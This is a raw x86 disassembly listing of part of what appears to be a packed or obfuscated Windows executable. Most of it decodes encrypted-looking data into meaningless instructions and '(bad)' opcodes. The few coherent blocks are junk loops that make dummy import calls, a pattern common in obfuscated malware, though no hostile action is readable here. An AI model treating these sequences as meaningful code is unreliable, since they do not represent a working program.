  409c62:	sahf   
  409c63:	jp     0x409c07
  409c65:	jle    0x409c91
  409c67:	into   
  409c68:	fist   WORD PTR [ebx+0x57c8a17a]
  409c6e:	jne    0x409ca0
  409c70:	add    bh,ah
  409c72:	int3   
  409c73:	push   ebx
  409c74:	aaa    
  409c75:	sahf   
  409c76:	or     al,0xf
  409c78:	stc    
  409c79:	shr    DWORD PTR [eax],cl
  409c7b:	not    DWORD PTR [eax]
  409c7d:	in     eax,0x2b
  409c7f:	mov    bh,0x54
  409c81:	mov    al,ds:0x2dc6ce76
  409c86:	sub    edi,DWORD PTR [edx-0x5ad2217a]
  409c8c:	popa   
  409c8d:	aam    0xcb
  409c8f:	call   0xe91a:0x52e9bd78
  409c96:	add    ch,bh
  409c98:	out    0x1e,eax
  409c9a:	cld    
  409c9b:	sbb    bh,BYTE PTR [eax+0x54a9bc0f]
  409ca1:	push   edi
  409ca2:	dec    ecx
  409ca3:	not    BYTE PTR [eax-0x6ca022c3]
  409ca9:	xchg   ecx,eax
  409caa:	lea    esp,[esi+eiz*4-0x10a4e10d]
  409cb1:	xchg   esi,eax
  409cb2:	outs   dx,BYTE PTR fs:[esi]
  409cb4:	push   es
  409cb5:	push   ds
  409cb6:	mov    ebx,0x47fb6e89
  409cbb:	into   
  409cbc:	cdq    
  409cbd:	not    BYTE PTR [edx+0x21]
  409cc0:	xor    BYTE PTR [edx-0x19],al
  409cc3:	pop    es
  409cc4:	fisubr WORD PTR [esi-0x3d386fe7]
  409cca:	lods   al,BYTE PTR es:[esi]
  409ccc:	mov    ch,0x13
  409cce:	stos   DWORD PTR es:[edi],eax
  409ccf:	mov    cl,0x4d
  409cd1:	(bad)  [ebx]
  409cd3:	arpl   WORD PTR [ebx-0x58],di
  409cd6:	lods   al,BYTE PTR ds:[esi]
  409cd7:	arpl   WORD PTR [eax-0x5a],cx
  409cda:	rol    DWORD PTR [edx+0x6599aa76],0xcf
  409ce1:	hlt    
  409ce2:	jecxz  0x409c6e
  409ce4:	js     0x409c9b
  409ce6:	lahf   
  409ce7:	mov    edi,0xdeeb8875
  409cec:	mov    edx,0x8f0c7363
  409cf1:	pushf  
  409cf2:	sbb    al,0x79
  409cf4:	mov    ebp,0x38ed531b
  409cf9:	jecxz  0x409d46
  409cfb:	or     di,WORD PTR [ebp+0x187ff006]
  409d02:	aas    
  409d03:	jge    0x409d03
  409d05:	mov    BYTE PTR [esi-0x60],ch
  409d08:	adc    DWORD PTR [esi],edx
  409d0a:	pop    ss
  409d0b:	push   ebp
  409d0c:	jge    0x409cc0
  409d0e:	push   esp
  409d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d10:	idiv   BYTE PTR [edx-0x6c1ae829]
  409d16:	inc    edi
  409d17:	add    ebx,DWORD PTR [ecx+0x144b2ba7]
  409d1d:	pop    es
  409d1e:	sub    eax,0x94172e48
  409d23:	hlt    
  409d24:	mov    eax,0xe4c56806
  409d29:	jle    0x409d60
  409d2b:	(bad)  
  409d2d:	cmp    DWORD PTR [edx],esi
  409d2f:	or     DWORD PTR [ebx],esi
  409d31:	outs   dx,DWORD PTR ds:[esi]
  409d32:	or     bl,BYTE PTR [ebx]
  409d34:	xchg   DWORD PTR [esi+0x3],edx
  409d37:	mov    WORD PTR [eax+ebp*2-0x199b89e],fs
  409d3e:	and    ecx,DWORD PTR [edi+0x58]
  409d41:	mov    fs,WORD PTR [edi-0x1c]
  409d44:	adc    eax,0x6b4e62df
  409d49:	xchg   BYTE PTR [edi+edx*1+0x30],ah
  409d4d:	out    0xb,eax
  409d4f:	adc    DWORD PTR [ecx+ebx*8+0x3ad300eb],edx
  409d56:	sub    dh,BYTE PTR [ecx-0x2f]
  409d59:	cmc    
  409d5a:	repnz add ebx,DWORD PTR [ebx]
  409d5d:	pop    esi
  409d5e:	std    
  409d5f:	push   eax
  409d60:	dec    ebp
  409d61:	lods   eax,DWORD PTR ds:[esi]
  409d62:	cmc    
  409d63:	aam    0x79
  409d65:	fxch   st(4)
  409d67:	pop    esi
  409d68:	rcl    esi,cl
  409d6a:	pop    edx
  409d6b:	test   BYTE PTR ds:0x15149b1a,dh
  409d71:	or     al,0xa7
  409d73:	(bad)  
  409d74:	sub    eax,0xf12c9655
  409d79:	jne    0x409d9f
  409d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d7c:	je     0x409d4e
  409d7e:	inc    esi
  409d7f:	jg     0x409d21
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433717,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	xor    eax,DWORD PTR [ebx-0x1dc7ef86]
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	jecxz  0x409de0
  409dcc:	sbb    DWORD PTR [eax],edi
  409dce:	push   0xa6494851
  409dd3:	cmc    
  409dd4:	loopne 0x409e23
  409dd6:	jae    0x409dc1
  409dd8:	mov    ds:0x98c3aa80,al
  409ddd:	aad    0xc5
  409ddf:	push   es
  409de0:	jmp    DWORD PTR [ecx+0x39]
  409de3:	mov    ebx,0x50b756b7
  409de8:	sbb    eax,0x383fc5d0
  409ded:	mov    ecx,0xc609f486
  409df2:	pop    es
  409df3:	js     0x409e74
  409df5:	pop    ds
  409df6:	adc    DWORD PTR [esp+ebx*1],edi
  409df9:	lahf   
  409dfa:	popf   
  409dfb:	lods   al,BYTE PTR ds:[esi]
  409dfc:	cdq    
  409dfd:	push   ds
  409dfe:	xor    bh,BYTE PTR [eax]
  409e00:	fs sbb eax,0xebb56777
  409e06:	inc    esi
  409e07:	pop    edi
  409e08:	mov    tr2,esp
  409e0b:	and    DWORD PTR [ecx],ebx
  409e0d:	(bad)  [ecx]
  409e10:	test   DWORD PTR [ebx-0x10af68be],esp
  409e16:	and    ebp,DWORD PTR [eax+0x6]
  409e19:	push   edi
  409e1a:	mov    ah,0x9a
  409e1c:	scas   al,BYTE PTR es:[edi]
  409e1d:	cli    
  409e1e:	popa   
  409e1f:	nop
  409e20:	xor    ch,BYTE PTR ds:0xbdc5539b
  409e26:	pusha  
  409e27:	pop    esi
  409e28:	out    0xd0,eax
  409e2a:	or     eax,DWORD PTR [edx-0x4]
  409e2d:	adc    esi,esi
  409e2f:	jmp    0x78bd:0xec849541
  409e36:	pop    es
  409e37:	pop    esp
  409e38:	stc    
  409e39:	int3   
  409e3a:	jge    0x409e71
  409e3c:	fistp  QWORD PTR [esi+0x44]
  409e3f:	mov    eax,ds:0x117e25b2
  409e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e45:	xlat   BYTE PTR ds:[ebx]
  409e46:	cmp    al,0x29
  409e48:	(bad)  
  409e49:	jo     0x409e78
  409e4b:	arpl   WORD PTR ds:0x259fcda2,bx
  409e51:	stc    
  409e52:	adc    eax,0xb68e6169
  409e57:	or     BYTE PTR ds:0xc1b79f8d,dl
  409e5d:	sub    bh,BYTE PTR [ebx]
  409e5f:	inc    BYTE PTR [ebp-0xeaf26a9]
  409e65:	push   es
  409e66:	inc    esi
  409e67:	lock and dh,cl
  409e6a:	in     al,0x36
  409e6c:	mov    ch,0x7
  409e6e:	xchg   ebx,eax
  409e6f:	or     eax,0xa9b0d047
  409e74:	or     al,0x82
  409e76:	test   DWORD PTR [edx+0x2fae31e1],edx
  409e7c:	xchg   edx,eax
  409e7d:	imul   esi,ebx,0xffffff8b
  409e80:	push   edi
  409e81:	jne    0x409ee8
  409e83:	add    dl,ah
  409e85:	cmp    al,0x3c
  409e87:	popf   
  409e88:	stos   BYTE PTR es:[edi],al
  409e89:	cmp    DWORD PTR [esp+edx*4-0x26],ecx
  409e8d:	push   ebx
  409e8e:	fcmovu st,st(5)
  409e90:	ss pop es
  409e92:	mov    esp,0x66f8adfe
  409e97:	lahf   
  409e98:	popf   
  409e99:	jge    0x409e27
  409e9b:	or     ah,BYTE PTR [edi+eiz*2+0x71240595]
  409ea2:	dec    esi
  409ea3:	stc    
  409ea4:	xchg   BYTE PTR [ebx+0x286009a1],ah
  409eaa:	outs   dx,BYTE PTR ds:[esi]
  409eab:	mov    BYTE PTR [esi-0x5c8ed554],ch
  409eb1:	xchg   esi,eax
  409eb2:	(bad)  
  409eb3:	push   ebx
  409eb4:	mov    al,ds:0x4037edaa
  409eb9:	rcr    DWORD PTR [ecx],0x2b
  409ebc:	push   esi
  409ebd:	xchg   ebx,eax
  409ebe:	or     BYTE PTR [eax-0x67],bh
  409ec1:	ja     0x409f42
  409ec3:	shr    dh,1
  409ec5:	or     eax,0xab0441ba
  409eca:	in     al,dx
  409ecb:	cli    
  409ecc:	shl    BYTE PTR [eax-0x6132948c],cl
  409ed2:	lahf   
  409ed3:	sti    
  409ed4:	ret    0xfae1
  409ed7:	xchg   ebp,eax
  409ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ed9:	shr    bl,0x91
  409edc:	jns    0x409eac
  409ede:	call   0x88ac:0xfe17be44
  409ee5:	mov    ebp,0x17843978
  409eea:	repz xlat BYTE PTR ds:[ebx]
  409eec:	out    dx,eax
  409eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eee:	bndstx [edx-0x484c48f3],bnd3
  409ef5:	mov    dl,0x67
  409ef7:	test   al,0xa1
  409ef9:	mov    al,bh
  409efb:	ss addr16 das 
  409efe:	cmp    bl,BYTE PTR [edi+0x1b]
  409f01:	loope  0x409eba
  409f03:	pop    esi
  409f04:	fdiv   st(4),st
  409f06:	pop    ebp
  409f07:	mov    ds:0x79d5f70a,eax
  409f0c:	jo     0x409f53
  409f0e:	pop    ecx
  409f0f:	bound  edi,QWORD PTR [eax+edi*4+0x39]
  409f13:	push   0x5a
  409f15:	or     BYTE PTR [eax+edx*2],bl
  409f18:	pop    esi
  409f19:	ds push esp
  409f1b:	(bad)
  409f1f:	mov    dh,0x64
  409f21:	dec    ebp
  409f22:	(bad)  
  409f23:	and    al,0x8a
  409f25:	jecxz  0x409f00
  409f27:	jne    0x409f44
  409f29:	xchg   edi,eax
  409f2a:	(bad)  
  409f2b:	test   al,0x6a
  409f2d:	adc    BYTE PTR [ebp-0x8db00c],al
  409f33:	push   ebx
  409f34:	jae    0x409ece
  409f36:	retf   0x1813
  409f39:	adc    edi,eax
  409f3b:	ds push ecx
  409f3d:	fcomp  QWORD PTR [ebp-0x1d8e59d7]
  409f43:	xor    eax,0xd206176d
  409f48:	mov    bh,0x21
  409f4a:	mov    cs,WORD PTR [ecx]
  409f4c:	cwde   
  409f4d:	mov    bl,0x70
  409f4f:	mov    edi,0x2b06e0ab
  409f54:	in     eax,0xe
  409f56:	pop    ecx
  409f57:	out    dx,eax
  409f58:	sub    DWORD PTR [ebx+0x5ecbd65],esi
  409f5e:	imul   eax,DWORD PTR [esi+0x33],0xffffffd9
  409f62:	dec    esi
  409f63:	aad    0x54
  409f65:	xchg   ecx,eax
  409f66:	sub    esi,DWORD PTR [ebx+0x446720cc]
  409f6c:	inc    ecx
  409f6d:	add    bl,cl
  409f6f:	pop    esi
  409f70:	sbb    ah,BYTE PTR [ecx-0x4d]
  409f73:	and    bl,al
  409f75:	sub    edi,DWORD PTR [ebp+0x2749f30a]
  409f7b:	sbb    DWORD PTR [esi+eax*4],eax
  409f7e:	cs test eax,esi
  409f81:	and    edi,DWORD PTR [edx+0x3fd98a15]
  409f87:	imul   eax,DWORD PTR [ecx],0xf5e2321
  409f8d:	retf   0xbfd
  409f90:	inc    esi
  409f91:	imul   BYTE PTR [ebx+0x7a]
  409f94:	jae    0x409fbc
  409f96:	out    dx,eax
  409f97:	mov    esp,0x9dd1f0e3
  409f9c:	stos   DWORD PTR es:[edi],eax
  409f9d:	fwait
  409f9e:	repnz and DWORD PTR [edi+0x72a6b2d1],esi
  409fa5:	cdq    
  409fa6:	xchg   DWORD PTR [ebp+0x39628b60],ebx
  409fac:	daa    
  409fad:	inc    esp
  409fae:	shl    DWORD PTR [edx-0x3ba96ab8],1
  409fb4:	adc    BYTE PTR [ecx+0x70],0x77
  409fb8:	cmp    BYTE PTR [esi+edx*8],bl
  409fbb:	xor    DWORD PTR [ebp-0x4d86425f],edi
  409fc1:	mov    esi,0x7fb5e9a2
  409fc6:	cmp    esi,DWORD PTR [edi-0x3cfe641]
  409fcc:	pusha  
  409fcd:	pop    esp
  409fce:	jne    0x409fd7
  409fd0:	icebp  
  409fd1:	aas    
  409fd2:	das    
  409fd3:	loop   0x409fa2
  409fd5:	pushf  
  409fd6:	ja     0x409fa8
  409fd8:	dec    esi
  409fd9:	out    dx,al
  409fda:	pop    edi
  409fdb:	jno    0x40a033
  409fdd:	inc    esi
  409fde:	(bad)  
  409fdf:	cmp    dh,cl
  409fe1:	adc    DWORD PTR [ebx+ebx*1+0x7a],edi
  409fe5:	call   FWORD PTR [esi+edx*1+0x5127d5f8]
  409fec:	mov    edx,0x9dedd7f6
  409ff1:	push   ebx
  409ff2:	aad    0x4d
  409ff4:	or     DWORD PTR [ecx-0x78f00f0d],ecx
  409ffa:	push   cs
  409ffb:	out    dx,eax
  409ffc:	sub    BYTE PTR [ebp+ebp*8+0x7f],cl
  40a000:	mov    es,ebp
  40a002:	mov    edx,DWORD PTR [ebx]
  40a004:	xchg   ecx,eax
  40a005:	fdivr  DWORD PTR [ebp+0x69]
  40a008:	sub    bh,BYTE PTR [esi-0x2494ba30]
  40a00e:	mov    bh,0xa4
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	xchg   edx,eax
  40a127:	ja     0x40a144
  40a129:	jl     0x40a0ad
  40a12b:	loopne 0x40a1ab
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a18b
  40a133:	jno    0x40a18f
  40a135:	and    bh,BYTE PTR [edx+edx*2]
  40a138:	scas   eax,DWORD PTR es:[edi]
  40a139:	clc    
  40a13a:	repnz or DWORD PTR [ebp-0x21ea0856],ebx
  40a141:	(bad)  
  40a142:	dec    esp
  40a143:	gs js  0x40a0d9
  40a146:	int3   
  40a147:	lods   al,BYTE PTR ds:[esi]
  40a148:	repnz popf 
  40a14a:	sbb    BYTE PTR [edx],dh
  40a14c:	pop    ss
  40a14d:	ins    BYTE PTR es:[edi],dx
  40a14e:	mov    dh,0x5e
  40a150:	mov    edi,0x91034779
  40a155:	ss pop ecx
  40a157:	cs jns 0x40a16b
  40a15a:	retf   
  40a15b:	cmp    edx,DWORD PTR [ecx+0x38e75bf6]
  40a161:	inc    ebx
  40a162:	fcom   DWORD PTR [edx+0x29]
  40a165:	xor    al,0x95
  40a167:	adc    eax,0x631e670e
  40a16c:	xor    ch,BYTE PTR [esi]
  40a16e:	inc    ecx
  40a16f:	mov    ch,0xf9
  40a171:	jg     0x40a14d
  40a173:	stos   BYTE PTR es:[edi],al
  40a174:	cmp    bl,BYTE PTR [edi-0x36dbd9ad]
  40a17a:	sbb    DWORD PTR [ecx-0x3fd0ffc4],0x30
  40a181:	adc    ebx,edi
  40a183:	aam    0xf5
  40a185:	fwait
  40a186:	or     ah,BYTE PTR [edx-0x659a7223]
  40a18c:	rcl    DWORD PTR [eax+0x315057d1],0x50
  40a193:	add    BYTE PTR [ebx+0x3907793b],0xd9
  40a19a:	ds (bad) 
  40a19c:	fsqrt  
  40a19e:	bound  ebp,QWORD PTR [edx]
  40a1a0:	sub    eax,0xc3250ae3
  40a1a5:	and    al,0x56
  40a1a7:	mov    al,ds:0x8b446d65
  40a1ac:	daa    
  40a1ad:	leave  
  40a1ae:	jecxz  0x40a17d
  40a1b0:	adc    BYTE PTR ds:0x79123ee7,ah
  40a1b6:	imul   edx,ecx,0x75
  40a1b9:	sbb    ah,al
  40a1bb:	das    
  40a1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1bd:	sbb    BYTE PTR [esi],bl
  40a1bf:	and    al,BYTE PTR [edx-0x4b]
  40a1c2:	add    al,0x79
  40a1c4:	add    al,0xc8
  40a1c6:	pop    eax
  40a1c7:	mov    bl,0x90
  40a1c9:	retf   
  40a1ca:	mov    edi,?
  40a1cc:	adc    eax,0x2ce318da
  40a1d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d2:	xor    dh,BYTE PTR [eax]
  40a1d4:	mov    gs,WORD PTR [ebx]
  40a1d6:	xchg   BYTE PTR [eax-0x738b47c2],dl
  40a1dc:	idiv   DWORD PTR [edx-0x5]
  40a1df:	add    BYTE PTR ds:[edi],dl
  40a1e2:	out    dx,eax
  40a1e3:	scas   al,BYTE PTR es:[edi]
  40a1e4:	sahf   
  40a1e5:	jno    0x40a25f
  40a1e7:	xchg   edi,eax
  40a1e8:	xlat   BYTE PTR ds:[ebx]
  40a1e9:	mov    al,0x26
  40a1eb:	jns    0x40a218
  40a1ed:	push   edi
  40a1ee:	dec    esi
  40a1ef:	xor    BYTE PTR [edx],ch
  40a1f1:	push   ebp
  40a1f2:	xchg   ebx,eax
  40a1f3:	ds lds edi,FWORD PTR cs:[ebp-0x70653fa8]
  40a1fb:	repnz das 
  40a1fd:	in     al,dx
  40a1fe:	add    bh,BYTE PTR [edi+0x3e]
  40a201:	push   edi
  40a202:	inc    sp
  40a204:	sahf   
  40a205:	dec    ebp
  40a206:	mov    bh,0x2f
  40a208:	pop    ecx
  40a209:	pop    ds
  40a20a:	xor    dl,BYTE PTR [esi]
  40a20c:	(bad)  
  40a20d:	sahf   
  40a20e:	idiv   BYTE PTR [edx]
  40a210:	shl    ecx,1
  40a212:	iret   
  40a213:	test   DWORD PTR [esi+0x4b26beb],esi
  40a219:	(bad)
  40a21c:	push   0xa
  40a21e:	das    
  40a21f:	mov    bl,0x3c
  40a221:	les    ecx,FWORD PTR [eax]
  40a223:	jl     0x40a264
  40a225:	or     al,0xa5
  40a227:	xchg   ebx,eax
  40a228:	retf   0x5109
  40a22b:	jbe    0x40a22d
  40a22d:	jmp    FWORD PTR cs:[esp+eiz*8]
  40a231:	dec    ecx
  40a232:	enter  0xc582,0xc2
  40a236:	mov    bl,0x33
  40a238:	jne    0x40a1d1
  40a23a:	mov    ds:0x5578e19,al
  40a23f:	mov    dh,0x29
  40a241:	cmp    eax,0x253cdbe1
  40a246:	pop    edi
  40a247:	and    DWORD PTR [eax+eax*4+0x59],0xc68dc6b4
  40a24f:	pop    esp
  40a250:	push   esi
  40a251:	nop
  40a252:	addr16 dec esi
  40a254:	test   ecx,eax
  40a256:	mov    bh,0xda
  40a258:	loopne 0x40a2d4
  40a25a:	in     al,0x32
  40a25c:	ds ja  0x40a2c3
  40a25f:	mov    eax,0xd2cc5757
  40a264:	mov    BYTE PTR [ecx+0x2f],dh
  40a267:	sbb    al,bl
  40a269:	adc    ah,dh
  40a26b:	js     0x40a2a3
  40a26d:	test   BYTE PTR [edx+0x74],dh
  40a270:	fsub   DWORD PTR [esi+0x76f870c8]
  40a276:	jge    0x40a23c
  40a278:	xchg   DWORD PTR [edx+eiz*2],edi
  40a27b:	xchg   ebp,eax
  40a27c:	mov    esp,0x249bd0d6
  40a281:	or     eax,0xe1b852d2
  40a286:	clc    
  40a287:	fisubr WORD PTR [esi]
  40a289:	mov    ebp,0x38cc6633
  40a28e:	int    0x5e
  40a290:	cmp    al,0x83
  40a292:	jl     0x40a303
  40a294:	clc    
  40a295:	mov    ebp,0x51dbc07a
  40a29a:	inc    ebp
  40a29b:	jmp    0x3f8b3ca3
  40a2a0:	retf   0xd2e3
  40a2a3:	int3   
  40a2a4:	dec    ebx
  40a2a5:	hlt    
  40a2a6:	inc    esp
  40a2a7:	scas   al,BYTE PTR es:[edi]
  40a2a8:	stos   DWORD PTR es:[edi],eax
  40a2a9:	pusha  
  40a2aa:	inc    ebp
  40a2ab:	ja     0x40a28c
  40a2ad:	fwait
  40a2ae:	ss xchg esi,edx
  40a2b1:	shl    al,0x5e
  40a2b4:	xlat   BYTE PTR ds:[ebx]
  40a2b5:	or     edx,0x9bd17441
  40a2bb:	mov    eax,0xe335004c
  40a2c0:	scas   al,BYTE PTR es:[edi]
  40a2c1:	sub    eax,0xf8bc5809
  40a2c6:	ja     0x40a292
  40a2c8:	and    al,0x74
  40a2ca:	mov    esi,0x7c6237fa
  40a2cf:	jmp    0xb2f3e51
  40a2d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2d5:	lahf   
  40a2d6:	outs   dx,BYTE PTR ds:[esi]
  40a2d7:	pop    ecx
  40a2d8:	push   es
  40a2d9:	cmp    BYTE PTR [edx+ebp*8],al
  40a2dc:	inc    esp
  40a2dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2de:	dec    ebp
  40a2df:	add    al,0x86
  40a2e1:	push   ebp
  40a2e2:	rcr    BYTE PTR [edi],0xe0
  40a2e5:	(bad)
  40a2e8:	popf   
  40a2e9:	idiv   BYTE PTR [edi-0x24d549fc]
  40a2ef:	lahf   
  40a2f0:	icebp  
  40a2f1:	div    DWORD PTR [edx]
  40a2f3:	(bad)  
  40a2f4:	pop    ebp
  40a2f5:	loop   0x40a315
  40a2f7:	ret    
  40a2f8:	jae    0x40a286
  40a2fa:	in     al,0x63
  40a2fc:	mov    ebx,0x5c052699
  40a301:	jne    0x40a36c
  40a303:	ret    
  40a304:	sbb    al,0x9
  40a307:	ins    DWORD PTR es:[edi],dx
  40a308:	fs or  dl,0xe0
  40a30c:	mov    eax,0xabcdf2d9
  40a311:	call   0x83f3:0xcd81b52f
  40a318:	pop    esp
  40a319:	dec    edi
  40a31a:	jae    0x40a2f5
  40a31c:	jmp    0xe9b8e748
  40a321:	cmp    ah,bh
  40a323:	lds    ebp,FWORD PTR [esi+ecx*1+0x5]
  40a327:	or     al,bh
  40a329:	mov    eax,0x6c20559
  40a32e:	ins    DWORD PTR es:[edi],dx
  40a32f:	adc    edi,DWORD PTR [ecx+0x26]
  40a332:	dec    esp
  40a333:	outs   dx,DWORD PTR ds:[esi]
  40a334:	sar    BYTE PTR [ecx+ecx*2],cl
  40a337:	daa    
  40a338:	pusha  
  40a339:	pusha  
  40a33a:	pusha  
  40a33b:	xor    ecx,DWORD PTR [edx]
  40a33d:	dec    esp
  40a33e:	add    BYTE PTR [ebp+0x4c4c7261],bh
  40a344:	inc    ecx
  40a345:	aas    
  40a346:	sub    DWORD PTR [ebp+0x4acef445],esi
  40a34c:	ja     0x40a37d
  40a34e:	out    0xde,al
  40a350:	push   edi
  40a351:	add    al,0xb8
  40a353:	sahf   
  40a354:	mov    ecx,0x458cf915
  40a359:	lods   al,BYTE PTR ds:[esi]
  40a35a:	stos   DWORD PTR es:[edi],eax
  40a35b:	lea    ebp,[eax+0xd]
  40a35e:	add    DWORD PTR [esi+0x68],edx
  40a361:	dec    ebx
  40a362:	mov    ds:0xd25b3f95,eax
  40a367:	jne    0x40a399
  40a369:	xchg   ebp,eax
  40a36a:	push   cs
  40a36b:	shr    DWORD PTR [esi+eiz*8+0x79],cl
  40a36f:	sbb    dh,bh
  40a371:	mov    gs:0x69eb91e1,al
  40a377:	dec    edi
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4336fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4336fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4336fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4336fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    eax,0x4c8e19ef
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	fiadd  WORD PTR [edx+ebp*8+0x3b5af3ea]
  40a4ae:	cmp    eax,0x50ffd67b
  40a4b3:	test   DWORD PTR [ecx],esp
  40a4b5:	(bad)  
  40a4b6:	out    dx,eax
  40a4b7:	aaa    
  40a4b8:	mov    ecx,0xe8c7af14
  40a4bd:	or     BYTE PTR [edi-0x34],ah
  40a4c0:	cmp    esi,DWORD PTR [eax-0x58]
  40a4c3:	sbb    DWORD PTR [ebx+0x18],0xa62b84bb
  40a4ca:	sbb    edi,eax
  40a4cc:	xchg   edx,eax
  40a4ce:	fidiv  WORD PTR [ebx+0x13]
  40a4d1:	sar    DWORD PTR fs:0x57ca6df9,cl
  40a4d8:	dec    esp
  40a4d9:	push   edi
  40a4da:	iret   
